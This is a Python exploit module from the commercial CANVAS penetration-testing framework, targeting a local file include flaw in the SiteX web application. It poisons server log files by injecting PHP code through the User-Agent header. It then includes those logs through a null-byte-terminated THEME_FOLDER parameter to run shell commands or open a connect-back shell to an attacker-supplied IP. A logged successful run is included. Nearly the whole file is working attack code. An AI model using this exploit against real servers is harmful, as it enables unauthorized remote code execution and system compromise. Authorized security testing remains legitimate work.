#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *
import canvasengine
import time
import urllib
import libs.spkproxy as spkproxy #for urlopen

NAME="SiteX <= 0.7.4.418 Local File Include"
DESCRIPTION="SiteX <= 0.7.4.418 Local File Include"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="SiteX"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]= "None"
DOCUMENTATION["CVE Url"]= "None" 
DOCUMENTATION["References"]=["http://milw0rm.com/exploits/8816"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Requires Magic_quotes_gpc = Off in php.ini 
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Using version: 0
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Using basepath=/
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Using vhost=None
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Using Testfile=index.php
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Testing hostname: 192.168.121.133
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Testing for basepath: /sitex/
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Found Potential vulnerable php app in vhost 192.168.121.133at basepath /sitex/
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Attacking 192.168.121.133:80
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Basic Auth User: 
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) VHost: 192.168.121.133
[ Wed May 27 17:21:29 2009 ][C] (192.168.121.133/32) Command: id
[ Wed May 27 17:21:30 2009 ][C] (192.168.121.133/32) Command response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

"""

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/sitex/","/SiteX/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.hostname=None
        self.foundstrings=["SiteX"]
        self.testfile="index.php"

        return

    def request1(self):
        """
	Goes through a loop of log file paths in the phpexploit class
	and trys to inject/include PHPcode in these log files to get execution.
        """

        if self.command:
            self.log("Command: %s"%self.command)
            tag1   = "".join( [random.choice(string.digits) for i in xrange(8)] )
            tag2   = "".join( [random.choice(string.digits) for i in xrange(8)] )
            command=self.command
            command="<?print("+tag1+");passthru('"+command+"');print("+tag2+");?>"

            for i in self.log_paths:

                data = self.UA.addHeader("User-Agent",command)
                setup= self.UA.GET("index.php")
                time.sleep(0.1)
                data = self.UA.GET("themes/Corporate/homepage.php?THEME_FOLDER=%s%%00"%i)

                if "Permission denied" in data:
                    self.log("[*] Log files arent readable")
                    return 0
                if tag1 in data:
                    result=data.split('"'+tag1)[1].split(tag2)[0]
                    self.log("Command response: %s"%prettyprint(result))
                    return 0
                else: 
                    self.log("Command not run?")
                    return 0

        else:
            command=self.get_php_to_mosdef()
            command=b64encode(command)

            for i in self.log_paths:

                data = self.UA.addHeader("User-Agent","<?eval(base64_decode($_REQUEST['c']));?>")
                setup= self.UA.GET("index.php")
                time.sleep(0.1)
                data = self.UA.GET("themes/Corporate/homepage.php?THEME_FOLDER=%s&c=%s%%00"%(i,command))

                if "Permission denied" in data:
                    self.log("[*] Log files arent readable")
                    return 0

            self.log("[+] Looking for PHP connectback")

            ret=self.ISucceeded()

        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>                [optional]"
        print "-O basepath: /path/to/sitex/    [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
